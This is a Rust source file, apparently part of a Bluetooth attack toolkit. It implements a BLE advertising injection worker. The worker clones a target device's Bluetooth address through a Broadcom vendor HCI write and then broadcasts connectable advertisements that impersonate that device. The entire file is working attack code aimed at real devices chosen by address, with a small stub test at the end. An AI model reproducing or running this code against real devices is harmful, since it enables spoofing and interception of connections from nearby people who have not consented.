//! BLE advertising injection attack worker.
//!
//! Clones a target's BDADDR, sets custom advertising data, and enables
//! advertising to impersonate the target device.

use std::time::Instant;

use super::hci::{HciCommand, HciSocket};
use super::{BtAttackResult, BtAttackType, BtCapture};

// HCI OGF for LE Controller commands
const OGF_LE: u8 = 0x08;

// HCI LE opcodes
const LE_SET_ADV_PARAMS: u16 = 0x06;
const LE_SET_ADV_DATA: u16 = 0x08;
const LE_SET_ADV_ENABLE: u16 = 0x0A;

// BCM vendor opcodes
const WRITE_BDADDR: u16 = 0x01;

/// BLE advertising injection: impersonate a target by cloning its BDADDR
/// and broadcasting crafted advertising data.
///
/// Steps:
/// 1. Clone target BDADDR via vendor Write_BDADDR (0x01)
/// 2. Set advertising parameters (connectable undirected, all channels)
/// 3. Set advertising data (flags + short local name)
/// 4. Enable advertising
pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
    let start = Instant::now();
    log::info!("ble_adv: targeting {} — cloning BDADDR + injecting adverts", target_addr);

    let bdaddr = parse_bdaddr(target_addr);

    // Step 1: Clone target BDADDR via vendor command.
    let cmd = HciCommand::vendor(WRITE_BDADDR, bdaddr.to_vec());
    if let Err(e) = hci.send_command(&cmd) {
        log::info!("ble_adv: Write_BDADDR failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::BleAdvInjection,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("Write_BDADDR failed: {}", e)),
            timestamp: start,
        };
    }
    log::info!("ble_adv: BDADDR cloned to {}", target_addr);

    // Step 2: Set advertising parameters.
    // HCI_LE_Set_Advertising_Parameters:
    //   adv_interval_min(2) + adv_interval_max(2) + adv_type(1) +
    //   own_addr_type(1) + peer_addr_type(1) + peer_addr(6) +
    //   adv_channel_map(1) + adv_filter_policy(1)
    let mut adv_params = Vec::with_capacity(15);
    adv_params.extend_from_slice(&0x00A0u16.to_le_bytes()); // min interval: 100ms
    adv_params.extend_from_slice(&0x00A0u16.to_le_bytes()); // max interval: 100ms
    adv_params.push(0x00); // adv_type: ADV_IND (connectable undirected)
    adv_params.push(0x00); // own_addr_type: public
    adv_params.push(0x00); // peer_addr_type: public (unused for ADV_IND)
    adv_params.extend_from_slice(&[0x00; 6]); // peer_addr: unused
    adv_params.push(0x07); // channel_map: all 3 channels (37, 38, 39)
    adv_params.push(0x00); // filter_policy: process all

    let cmd = HciCommand::new(OGF_LE, LE_SET_ADV_PARAMS, adv_params);
    if let Err(e) = hci.send_command(&cmd) {
        log::info!("ble_adv: Set_Adv_Params failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::BleAdvInjection,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("Set_Adv_Params failed: {}", e)),
            timestamp: start,
        };
    }

    // Step 3: Set advertising data.
    // Format: length(1) + data(up to 31 bytes)
    // We set: Flags (LE General Discoverable + BR/EDR Not Supported)
    //       + Short Local Name "OxiGT"
    let adv_payload: Vec<u8> = vec![
        // AD struct 1: Flags
        0x02, // length
        0x01, // type: Flags
        0x06, // LE General Discoverable + BR/EDR Not Supported
        // AD struct 2: Short Local Name
        0x06, // length
        0x08, // type: Shortened Local Name
        b'O', b'x', b'i', b'G', b'T',
    ];

    let mut adv_data = Vec::with_capacity(32);
    adv_data.push(adv_payload.len() as u8); // data length
    adv_data.extend_from_slice(&adv_payload);
    // Pad to 31 bytes
    adv_data.resize(32, 0x00);

    let cmd = HciCommand::new(OGF_LE, LE_SET_ADV_DATA, adv_data);
    if let Err(e) = hci.send_command(&cmd) {
        log::info!("ble_adv: Set_Adv_Data failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::BleAdvInjection,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("Set_Adv_Data failed: {}", e)),
            timestamp: start,
        };
    }

    // Step 4: Enable advertising.
    let cmd = HciCommand::new(OGF_LE, LE_SET_ADV_ENABLE, vec![0x01]); // enable
    match hci.send_command(&cmd) {
        Ok(resp) => {
            let success = resp.status == 0;
            log::info!(
                "ble_adv: advertising {} for {}",
                if success { "enabled" } else { "failed" },
                target_addr
            );

            BtAttackResult {
                attack_type: BtAttackType::BleAdvInjection,
                target_address: target_addr.to_string(),
                target_name: None,
                success,
                capture: if success {
                    Some(BtCapture::PairingTranscript {
                        address: target_addr.to_string(),
                        data: adv_payload,
                    })
                } else {
                    None
                },
                error: if success {
                    None
                } else {
                    Some(format!("HCI status 0x{:02X}", resp.status))
                },
                timestamp: start,
            }
        }
        Err(e) => {
            log::info!("ble_adv: Set_Adv_Enable failed: {}", e);
            BtAttackResult {
                attack_type: BtAttackType::BleAdvInjection,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("Set_Adv_Enable failed: {}", e)),
                timestamp: start,
            }
        }
    }
}

/// Parse BD_ADDR string to bytes in reversed (little-endian) order.
fn parse_bdaddr(addr: &str) -> [u8; 6] {
    let mut bytes = [0u8; 6];
    let parts: Vec<&str> = addr.split(':').collect();
    if parts.len() == 6 {
        for (i, part) in parts.iter().enumerate() {
            bytes[5 - i] = u8::from_str_radix(part, 16).unwrap_or(0);
        }
    }
    bytes
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_stub() {
        let hci = HciSocket::open(0).unwrap();
        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
        assert_eq!(result.attack_type, BtAttackType::BleAdvInjection);
        assert!(result.success);
    }
}
